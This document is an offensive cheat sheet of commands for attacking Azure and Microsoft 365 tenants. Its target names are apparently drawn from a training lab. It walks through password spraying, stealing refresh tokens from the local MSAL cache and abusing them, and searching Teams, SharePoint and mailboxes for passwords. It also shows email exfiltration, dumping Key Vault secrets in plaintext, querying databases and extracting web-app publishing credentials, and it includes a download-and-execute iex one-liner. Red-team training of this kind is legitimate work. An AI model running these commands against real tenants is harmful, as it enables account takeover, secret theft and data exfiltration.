## Refresh Tokens
Look for service principals and perform password spraying
```
az ad user list --query "[].userPrincipalName" --output tsv}
python3 o365spray.py --spray -U users.txt -P pass.txt --lockout 5 --domain megabigtech.com
```
Get Access Token
```
az account get-access-token 
az account get-access-token --resource "https://vault.azure.net"
(Get-AzAccessToken -ResourceUrl "https://vault.azure.net/").Token
(Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com/").Token
```
Obtain refresh token from files
```
Linux and Mac
 ~/.azure/msal_token_cache.json
 
Windows
%userprofile%\.azure\msal_token_cache.bin
```
Install old version az cli
```
Invoke-WebRequest -Uri https://azurecliprod.blob.core.windows.net/msi/azure-cli-2.3.0.msi -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi
```
Impersonate valid session
```
Select-AzContext
```
Get Refresh Tokens with Graphrunner
```
Get-GraphTokens
Get-GraphTokens –Device AndroidMobile  #using a MobileDevice
```
Get Refresh Token with Token Tactics v2
```
Import-Module .\TokenTactics.psm1
Get-Help Invoke-RefreshToMSGraphToken -Examples
Get-AzureToken -Client MSGraph
Invoke-RefreshToMSGraphToken -domain megabigtech.com -refreshToken "<token>"
$MSGraphToken.access_token
```
Dump Conditional Access Policies
```
roadrecon plugin policies; firefox ./caps.html
curl -sSf -H "Authorization: Bearer $token" 'https://graph.microsoft.com/beta/identity/conditionalaccess/policies' | jq
```
Get tokens from active session
```
roadrecon auth -u "user@domain.com" -p 'password'
roadrecon auth --device-code
```
Gather Information from Entra ID
```
roadrecon gather
```
Dump conditional policies
```
roadrecon plugin policies
```
Transfer data to bloodhound
```
roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp password
```

## Microsoft 365 Lateral Movement 

### AADInternals
Get Teams Messages
```
$tokens.refresh_token
RefreshTo-MSTeamsToken -domain megabigtech.com -RefreshToken 0.A…
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | fl id,content,deletiontime,*type*,DisplayName
```

### GraphRunner
Get information from Office365 licenses
```
curl https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') |iex
```
List GraphRunner Modules
```
List-GraphRunnerModules
```
List information from SharePoint and OneDrive
```
Get-Help Invoke-SearchSharePointAndOneDrive -examples
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
```
Get Information from teams
```
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```


## Exfiltrate Email information
Exfiltrate email
```
#Need an access token
python3 ./exfil_exchange_mail.py
```
Get information from email with GraphRunner
```
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```

## Key Vault
Read Key Vault Powershell 5
```
$secrets = Get-AzKeyVaultSecret -VaultName "MYVAULT"

foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    
    $secretValue = Get-AzKeyVaultSecret -VaultName "MYVAULT" -Name $secret.Name
    $secretValueSecureString = $secretValue.SecretValue
    
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValueSecureString)
    $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```

Read key Vault powershell 7 and above
```
$secrets = Get-AzKeyVaultSecret -VaultName "MYVAULT"

foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    $secretValue = Get-AzKeyVaultSecret -VaultName "MYVAULT" -Name $secret.Name
    $secretValueText = $secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText
    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```

## Database Retrieval
Interact with Database using Powershell
Connect to the database
```
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='PASSWORD'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=USERID;Password=$password;"
$conn.Open()
```
Inspect databases
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```
Inspect tables
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM Subscribers;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft
```
Finish connection to database
```
$conn.Close()
```
Get database connection using Vscode 
```
#Add MSSQL extensions and add connection string
Server=mbt-finance.database.windows.net;Database=Finance;User ID=USERID;Password=$password;
```
Database enumeration with sqlcmd
```
#Only if the tool is installed
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'PASSWORD' -d DATABASE -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'PASSWORD' -d DATABASE -Q "SELECT * FROM TABLENAME"
```

## kudu

## SFTP/FTPS
Exfiltrate webapp publishing profile
```
Note: Require Website Contributor Role

$webAppName = "megabigtech-hr-portal"
$resourceGroupName = "mbt-rg-12"

$publishingProfileXml = [xml](Get-AzWebAppPublishingProfile -Name $webAppName -ResourceGroupName $resourceGroupName -OutputFile null)

$username = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userName
$password = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userPWD
$ftpsProfile = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='FTP']")
$ftpsUrl = $ftpsProfile.publishUrl

$username
$password
$ftpsUrl
```
